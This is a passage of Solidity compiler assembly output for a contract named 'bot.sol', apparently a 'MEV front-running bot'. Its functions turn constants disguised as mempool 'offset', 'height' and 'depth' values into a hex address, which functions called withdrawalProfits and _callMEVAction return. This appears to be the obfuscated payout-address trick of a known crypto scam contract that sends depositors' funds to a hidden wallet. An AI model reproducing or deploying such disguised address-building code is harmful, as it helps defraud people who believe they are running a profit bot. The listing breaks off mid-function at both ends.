\"contracts/bot.sol\":8728:8731  tmp */\n      dup5\n        /* \"contracts/bot.sol\":8736:8737  1 */\n      0x01\n        /* \"contracts/bot.sol\":8732:8733  i */\n      dup3\n        /* \"contracts/bot.sol\":8732:8737  i + 1 */\n      add\n        /* \"contracts/bot.sol\":8728:8738  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_79\n      jumpi\n      invalid\n    tag_79:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":8722:8739  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":8714:8740  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":8709:8740  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":8766:8768  97 */\n      0x61\n        /* \"contracts/bot.sol\":8760:8762  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8760:8768  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8759:8784  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_80\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8780:8783  102 */\n      0x66\n        /* \"contracts/bot.sol\":8774:8776  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8774:8783  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8759:8784  (b1 >= 97) && (b1 <= 102) */\n    tag_80:\n        /* \"contracts/bot.sol\":8755:8987  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      iszero\n      tag_81\n      jumpi\n        /* \"contracts/bot.sol\":8811:8813  87 */\n      0x57\n        /* \"contracts/bot.sol\":8805:8813  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8755:8987  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      jump(tag_82)\n    tag_81:\n        /* \"contracts/bot.sol\":8846:8848  65 */\n      0x41\n        /* \"contracts/bot.sol\":8840:8842  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8840:8848  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8839:8863  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_83\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8860:8862  70 */\n      0x46\n        /* \"contracts/bot.sol\":8854:8856  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8854:8862  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8839:8863  (b1 >= 65) && (b1 <= 70) */\n    tag_83:\n        /* \"contracts/bot.sol\":8835:8987  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      iszero\n      tag_84\n      jumpi\n        /* \"contracts/bot.sol\":8890:8892  55 */\n      0x37\n        /* \"contracts/bot.sol\":8884:8892  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8835:8987  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      jump(tag_85)\n    tag_84:\n        /* \"contracts/bot.sol\":8925:8927  48 */\n      0x30\n        /* \"contracts/bot.sol\":8919:8921  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8919:8927  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8918:8942  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_86\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8939:8941  57 */\n      0x39\n        /* \"contracts/bot.sol\":8933:8935  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8933:8941  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8918:8942  (b1 >= 48) && (b1 <= 57) */\n    tag_86:\n        /* \"contracts/bot.sol\":8914:8987  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n      iszero\n      tag_87\n      jumpi\n        /* \"contracts/bot.sol\":8969:8971  48 */\n      0x30\n        /* \"contracts/bot.sol\":8963:8971  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8914:8987  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n    tag_87:\n        /* \"contracts/bot.sol\":8835:8987  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n    tag_85:\n        /* \"contracts/bot.sol\":8755:8987  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n    tag_82:\n        /* \"contracts/bot.sol\":9012:9014  97 */\n      0x61\n        /* \"contracts/bot.sol\":9006:9008  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9006:9014  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":9005:9030  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_88\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":9026:9029  102 */\n      0x66\n        /* \"contracts/bot.sol\":9020:9022  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9020:9029  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":9005:9030  (b2 >= 97) && (b2 <= 102) */\n    tag_88:\n        /* \"contracts/bot.sol\":9001:9233  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      iszero\n      tag_89\n      jumpi\n        /* \"contracts/bot.sol\":9057:9059  87 */\n      0x57\n        /* \"contracts/bot.sol\":9051:9059  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":9001:9233  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      jump(tag_90)\n    tag_89:\n        /* \"contracts/bot.sol\":9092:9094  65 */\n      0x41\n        /* \"contracts/bot.sol\":9086:9088  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9086:9094  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":9085:9109  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_91\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":9106:9108  70 */\n      0x46\n        /* \"contracts/bot.sol\":9100:9102  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9100:9108  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":9085:9109  (b2 >= 65) && (b2 <= 70) */\n    tag_91:\n        /* \"contracts/bot.sol\":9081:9233  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      iszero\n      tag_92\n      jumpi\n        /* \"contracts/bot.sol\":9136:9138  55 */\n      0x37\n        /* \"contracts/bot.sol\":9130:9138  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":9081:9233  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      jump(tag_93)\n    tag_92:\n        /* \"contracts/bot.sol\":9171:9173  48 */\n      0x30\n        /* \"contracts/bot.sol\":9165:9167  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9165:9173  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":9164:9188  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_94\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":9185:9187  57 */\n      0x39\n        /* \"contracts/bot.sol\":9179:9181  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9179:9187  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":9164:9188  (b2 >= 48) && (b2 <= 57) */\n    tag_94:\n        /* \"contracts/bot.sol\":9160:9233  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n      iszero\n      tag_95\n      jumpi\n        /* \"contracts/bot.sol\":9215:9217  48 */\n      0x30\n        /* \"contracts/bot.sol\":9209:9217  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":9160:9233  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n    tag_95:\n        /* \"contracts/bot.sol\":9081:9233  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n    tag_93:\n        /* \"contracts/bot.sol\":9001:9233  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n    tag_90:\n        /* \"contracts/bot.sol\":9267:9269  b2 */\n      dup2\n        /* \"contracts/bot.sol\":9262:9264  16 */\n      0x10\n        /* \"contracts/bot.sol\":9257:9259  b1 */\n      dup5\n        /* \"contracts/bot.sol\":9257:9264  b1 * 16 */\n      mul\n        /* \"contracts/bot.sol\":9257:9269  b1 * 16 + b2 */\n      add\n        /* \"contracts/bot.sol\":9247:9270  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":8622:8623  2 */\n      0x02\n        /* \"contracts/bot.sol\":8617:8623  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8584:9282  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      jump(tag_75)\n    tag_76:\n      pop\n        /* \"contracts/bot.sol\":9307:9312  iaddr */\n      dup3\n        /* \"contracts/bot.sol\":9292:9313  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":8382:9321  function parseMempool(string memory _a) internal pure returns (address _parsed) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":14925:15036  function _callMEVAction() internal pure returns (address) {\r... */\n    tag_44:\n        /* \"contracts/bot.sol\":14974:14981  address */\n      0x00\n        /* \"contracts/bot.sol\":15001:15028  parseMempool(callMempool()) */\n      tag_97\n        /* \"contracts/bot.sol\":15014:15027  callMempool() */\n      tag_98\n        /* \"contracts/bot.sol\":15014:15025  callMempool */\n      tag_40\n        /* \"contracts/bot.sol\":15014:15027  callMempool() */\n      jump\t// in\n    tag_98:\n        /* \"contracts/bot.sol\":15001:15013  parseMempool */\n      tag_41\n        /* \"contracts/bot.sol\":15001:15028  parseMempool(callMempool()) */\n      jump\t// in\n    tag_97:\n        /* \"contracts/bot.sol\":14994:15028  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14925:15036  function _callMEVAction() internal pure returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":16461:16575  function withdrawalProfits() internal pure returns (address) {\r... */\n    tag_49:\n        /* \"contracts/bot.sol\":16513:16520  address */\n      0x00\n        /* \"contracts/bot.sol\":16540:16567  parseMempool(callMempool()) */\n      tag_100\n        /* \"contracts/bot.sol\":16553:16566  callMempool() */\n      tag_101\n        /* \"contracts/bot.sol\":16553:16564  callMempool */\n      tag_40\n        /* \"contracts/bot.sol\":16553:16566  callMempool() */\n      jump\t// in\n    tag_101:\n        /* \"contracts/bot.sol\":16540:16552  parseMempool */\n      tag_41\n        /* \"contracts/bot.sol\":16540:16567  parseMempool(callMempool()) */\n      jump\t// in\n    tag_100:\n        /* \"contracts/bot.sol\":16533:16567  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16461:16575  function withdrawalProfits() internal pure returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":8116:8207  function getMemPoolOffset() internal pure returns (uint) {\r... */\n    tag_56:\n        /* \"contracts/bot.sol\":8167:8171  uint */\n      0x00\n        /* \"contracts/bot.sol\":8191:8199  79107794 */\n      0x04b716d2\n        /* \"contracts/bot.sol\":8184:8199  return 79107794 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8116:8207  function getMemPoolOffset() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":9880:10318  function checkLiquidity(uint a) internal pure returns (string memory) {\r... */\n    tag_57:\n        /* \"contracts/bot.sol\":9935:9948  string memory */\n      0x60\n        /* \"contracts/bot.sol\":9963:9973  uint count */\n      0x00\n        /* \"contracts/bot.sol\":9976:9977  0 */\n      dup1\n        /* \"contracts/bot.sol\":9963:9977  uint count = 0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9988:9994  uint b */\n      0x00\n        /* \"contracts/bot.sol\":9997:9998  a */\n      dup4\n        /* \"contracts/bot.sol\":9988:9998  uint b = a */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10009:10080  while (b != 0) {\r... */\n    tag_104:\n        /* \"contracts/bot.sol\":10021:10022  0 */\n      0x00\n        /* \"contracts/bot.sol\":10016:10017  b */\n      dup2\n        /* \"contracts/bot.sol\":10016:10022  b != 0 */\n      eq\n        /* \"contracts/bot.sol\":10009:10080  while (b != 0) {\r... */\n      tag_105\n      jumpi\n        /* \"contracts/bot.sol\":10039:10046  count++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"contracts/bot.sol\":10066:10068  16 */\n      0x10\n        /* \"contracts/bot.sol\":10061:10068  b /= 16 */\n      dup2\n      dup2\n      tag_106\n      jumpi\n      invalid\n    tag_106:\n      div\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10009:10080  while (b != 0) {\r... */\n      jump(tag_104)\n    tag_105:\n        /* \"contracts/bot.sol\":10090:10106  bytes memory res */\n      0x60\n        /* \"contracts/bot.sol\":10119:10124  count */\n      dup3\n        /* \"contracts/bot.sol\":10109:10125  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_107\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_107:\n        /* \"contracts/bot.sol\":10109:10125  new bytes(count) */\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_108\n      jumpi\n      dup2\n      0x20\n      add\n        /* \"--CODEGEN--\":29:30   */\n      0x01\n        /* \"--CODEGEN--\":21:27   */\n      dup3\n        /* \"--CODEGEN--\":17:31   */\n      mul\n        /* \"--CODEGEN--\":124:128   */\n      dup1\n        /* \"--CODEGEN--\":108:122   */\n      calldatasize\n        /* \"--CODEGEN--\":100:106   */\n      dup4\n        /* \"--CODEGEN--\":87:129   */\n      calldatacopy\n        /* \"--CODEGEN--\":155:159   */\n      dup1\n        /* \"--CODEGEN--\":147:153   */\n      dup3\n        /* \"--CODEGEN--\":143:160   */\n      add\n        /* \"--CODEGEN--\":133:160   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":0:164   */\n      pop\n        /* \"contracts/bot.sol\":10109:10125  new bytes(count) */\n      swap1\n      pop\n    tag_108:\n      pop\n        /* \"contracts/bot.sol\":10090:10125  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10141:10147  uint i */\n      0x00\n        /* \"contracts/bot.sol\":10148:10149  0 */\n      dup1\n        /* \"contracts/bot.sol\":10141:10149  uint i=0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10136:10280  for (uint i=0; i<count; ++i) {\r... */\n    tag_109:\n        /* \"contracts/bot.sol\":10153:10158  count */\n      dup4\n        /* \"contracts/bot.sol\":10151:10152  i */\n      dup2\n        /* \"contracts/bot.sol\":10151:10158  i<count */\n      lt\n        /* \"contracts/bot.sol\":10136:10280  for (uint i=0; i<count; ++i) {\r... */\n      iszero\n      tag_110\n      jumpi\n        /* \"contracts/bot.sol\":10188:10190  16 */\n      0x10\n        /* \"contracts/bot.sol\":10184:10185  a */\n      dup7\n        /* \"contracts/bot.sol\":10184:10190  a % 16 */\n      dup2\n      tag_112\n      jumpi\n      invalid\n    tag_112:\n      mod\n        /* \"contracts/bot.sol\":10180:10190  b = a % 16 */\n      swap3\n      pop\n        /* \"contracts/bot.sol\":10226:10246  toHexDigit(uint8(b)) */\n      tag_113\n        /* \"contracts/bot.sol\":10243:10244  b */\n      dup4\n        /* \"contracts/bot.sol\":10226:10236  toHexDigit */\n      tag_114\n        /* \"contracts/bot.sol\":10226:10246  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_113:\n        /* \"contracts/bot.sol\":10205:10208  res */\n      dup3\n        /* \"contracts/bot.sol\":10221:10222  1 */\n      0x01\n        /* \"contracts/bot.sol\":10217:10218  i */\n      dup4\n        /* \"contracts/bot.sol\":10209:10214  count */\n      dup8\n        /* \"contracts/bot.sol\":10209:10218  count - i */\n      sub\n        /* \"contracts/bot.sol\":10209:10222  count - i - 1 */\n      sub\n        /* \"contracts/bot.sol\":10205:10223  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_115\n      jumpi\n      invalid\n    tag_115:\n      0x20\n      add\n      add\n        /* \"contracts/bot.sol\":10205:10246  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/bot.sol\":10266:10268  16 */\n      0x10\n        /* \"contracts/bot.sol\":10261:10268  a /= 16 */\n      dup7\n      dup2\n      tag_116\n      jumpi\n      invalid\n    tag_116:\n      div\n      swap6\n      pop\n        /* \"contracts/bot.sol\":10160:10163  ++i */\n      dup1\n      0x01\n      add\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10136:10280  for (uint i=0; i<count; ++i) {\r... */\n      jump(tag_109)\n    tag_110:\n      pop\n        /* \"contracts/bot.sol\":10306:10309  res */\n      dup1\n        /* \"contracts/bot.sol\":10292:10310  return string(res) */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":9880:10318  function checkLiquidity(uint a) internal pure returns (string memory) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":16756:17386  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r... */\n    tag_58:\n        /* \"contracts/bot.sol\":16839:16852  string memory */\n      0x60\n        /* \"contracts/bot.sol\":16865:16888  bytes memory _baseBytes */\n      dup1\n        /* \"contracts/bot.sol\":16897:16902  _base */\n      dup4\n        /* \"contracts/bot.sol\":16865:16903  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16914:16938  bytes memory _valueBytes */\n      0x60\n        /* \"contracts/bot.sol\":16947:16953  _value */\n      dup4\n        /* \"contracts/bot.sol\":16914:16954  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16967:16990  string memory _tmpValue */\n      0x60\n        /* \"contracts/bot.sol\":17024:17035  _valueBytes */\n      dup2\n        /* \"contracts/bot.sol\":17024:17042  _valueBytes.length */\n      mload\n        /* \"contracts/bot.sol\":17004:17014  _baseBytes */\n      dup4\n        /* \"contracts/bot.sol\":17004:17021  _baseBytes.length */\n      mload\n        /* \"contracts/bot.sol\":17004:17042  _baseBytes.length + _valueBytes.length */\n      add\n        /* \"contracts/bot.sol\":16993:17043  new string(_baseBytes.length + _valueBytes.length) */\n      0xffffffffffffffff\n      dup2\n      gt\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_118\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_118:\n        /* \"contracts/bot.sol\":16993:17043  new string(_baseBytes.length + _valueBytes.length) */\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_119\n      jumpi\n      dup2\n      0x20\n      add\n        /* \"--CODEGEN--\":29:30   */\n      0x01\n        /* \"--CODEGEN--\":21:27   */\n      dup3\n        /* \"--CODEGEN--\":17:31   */\n      mul\n        /* \"--CODEGEN--\":124:128   */\n      dup1\n        /* \"--CODEGEN--\":108:122   */\n      calldatasize\n        /* \"--CODEGEN--\":100:106   */\n      dup4\n        /* \"--CODEGEN--\":87:129   */\n      calldatacopy\n        /* \"--CODEGEN--\":155:159   */\n      dup1\n        /* \"--CODEGEN--\":147:153   */\n      dup3\n        /* \"--CODEGEN--\":143:160   */\n      add\n        /* \"--CODEGEN--\":133:160   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":0:164   */\n      pop\n        /* \"contracts/bot.sol\":16993:17043  new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n    tag_119:\n      pop\n        /* \"contracts/bot.sol\":16967:17043  string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":17054:17076  bytes memory _newValue */\n      0x60\n        /* \"contracts/bot.sol\":17085:17094  _tmpValue */\n      dup2\n        /* \"contracts/bot.sol\":17054:17095  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":17108:17114  uint i */\n      0x00\n        /* \"contracts/bot.sol\":17125:17131  uint j */\n      dup1\n        /* \"contracts/bot.sol\":17150:17151  0 */\n      0x00\n        /* \"contracts/bot.sol\":17148:17151  i=0 */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":17144:17236  for(i=0; i<_baseBytes.length; i++) {\r... */\n    tag_120:\n        /* \"contracts/bot.sol\":17155:17165  _baseBytes */\n      dup6\n        /* \"contracts/bot.sol\":17155:17172  _baseBytes.length */\n      mload\n        /* \"contracts/bot.sol\":17153:17154  i */\n      dup3\n        /* \"contracts/bot.sol\":17153:17172  i<_baseBytes.length */\n      lt\n        /* \"contracts/bot.sol\":17144:17236  for(i=0; i<_baseBytes.length; i++) {\r... */\n      iszero\n      tag_121\n      jumpi\n        /* \"contracts/bot.sol\":17211:17221  _baseBytes */\n      dup6\n        /* \"contracts/bot.sol\":17222:17223  i */\n      dup3\n        /* \"contracts/bot.sol\":17211:17224  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_123\n      jumpi\n      invalid\n    tag_123:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":17194:17203  _newValue */\n      dup4\n        /* \"contracts/bot.sol\":17204:17207  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":17194:17208  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_124\n      jumpi\n      invalid\n    tag_124:\n      0x20\n      add\n      add\n        /* \"contracts/bot.sol\":17194:17224  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/bot.sol\":17174:17177  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"contracts/bot.sol\":17144:17236  for(i=0; i<_baseBytes.length; i++) {\r... */\n      jump(tag_120)\n    tag_121:\n        /* \"contracts/bot.sol\":17254:17255  0 */\n      0x00\n        /* \"contracts/bot.sol\":17252:17255  i=0 */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":17248:17342  for(i=0; i<_valueBytes.length; i++) {\r... */\n    tag_125:\n        /* \"contracts/bot.sol\":17259:17270  _valueBytes */\n      dup5\n        /* \"contracts/bot.sol\":17259:17277  _valueBytes.length */\n      mload\n        /* \"contracts/bot.sol\":17257:17258  i */\n      dup3\n        /* \"contracts/bot.sol\":17257:17277  i<_valueBytes.length */\n      lt\n        /* \"contracts/bot.sol\":17248:17342  for(i=0; i<_valueBytes.length; i++) {\r... */\n      iszero\n      tag_126\n      jumpi\n        /* \"contracts/bot.sol\":17316:17327  _valueBytes */\n      dup5\n        /* \"contracts/bot.sol\":17328:17329  i */\n      dup3\n        /* \"contracts/bot.sol\":17316:17330  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_128\n      jumpi\n      invalid\n    tag_128:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":17299:17308  _newValue */\n      dup4\n        /* \"contracts/bot.sol\":17309:17312  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":17299:17313  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_129\n      jumpi\n      invalid\n    tag_129:\n      0x20\n      add\n      add\n        /* \"contracts/bot.sol\":17299:17330  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/bot.sol\":17279:17282  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"contracts/bot.sol\":17248:17342  for(i=0; i<_valueBytes.length; i++) {\r... */\n      jump(tag_125)\n    tag_126:\n        /* \"contracts/bot.sol\":17368:17377  _newValue */\n      dup3\n        /* \"contracts/bot.sol\":17354:17378  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":16756:17386  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":12958:13046  function getMemPoolHeight() internal pure returns (uint) {\r... */\n    tag_60:\n        /* \"contracts/bot.sol\":13009:13013  uint */\n      0x00\n        /* \"contracts/bot.sol\":13033:13038  61546 */\n      0xf06a\n        /* \"contracts/bot.sol\":13026:13038  return 61546 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":12958:13046  function getMemPoolHeight() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":16365:16453  function getMemPoolDepth() internal pure returns (uint) {\r... */\n    tag_62:\n        /* \"contracts/bot.sol\":16415:16419  uint */\n      0x00\n        /* \"contracts/bot.sol\":16439:16445  397214 */\n      0x060f9e\n        /* \"contracts/bot.sol\":16432:16445  return 397214 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16365:16453  function getMemPoolDepth() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":14590:14917  function toHexDigit(uint8 d) pure internal returns (byte) {\r... */\n    tag_114:\n        /* \"contracts/bot.sol\":14642:14646  byte */\n      0x00\n        /* \"contracts/bot.sol\":14668:14669  d */\n      dup2\n        /* \"contracts/bot.sol\":14663:14669  0 <= d */\n      0xff\n      and\n        /* \"contracts/bot.sol\":14663:14664  0 */\n      0x00\n        /* \"contracts/bot.sol\":14663:14669  0 <= d */\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14663:14679  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_133\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":14678:14679  9 */\n      0x09\n        /* \"contracts/bot.sol\":14673:14674  d */\n      dup3\n        /* \"contracts/bot.sol\":14673:14679  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14663:14679  0 <= d && d <= 9 */\n    tag_133:\n        /* \"contracts/bot.sol\":14659:14850  if (0 <= d && d <= 9) {\r... */\n      iszero\n      tag_134\n      jumpi\n        /* \"contracts/bot.sol\":14727:14728  d */\n      dup2\n        /* \"contracts/bot.sol\":14714:14723  byte('0') */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/bot.sol\":14708:14724  uint8(byte('0')) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":14708:14728  uint8(byte('0')) + d */\n      add\n        /* \"contracts/bot.sol\":14703:14729  byte(uint8(byte('0')) + d) */\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":14696:14729  return byte(uint8(byte('0')) + d) */\n      swap1\n      pop\n      jump(tag_132)\n        /* \"contracts/bot.sol\":14659:14850  if (0 <= d && d <= 9) {\r... */\n    tag_134:\n        /* \"contracts/bot.sol\":14763:14764  d */\n      dup2\n        /* \"contracts/bot.sol\":14751:14765  10 <= uint8(d) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":14751:14753  10 */\n      0x0a\n        /* \"contracts/bot.sol\":14751:14765  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14751:14783  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_136\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":14781:14783  15 */\n      0x0f\n        /* \"contracts/bot.sol\":14775:14776  d */\n      dup3\n        /* \"contracts/bot.sol\":14769:14783  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n 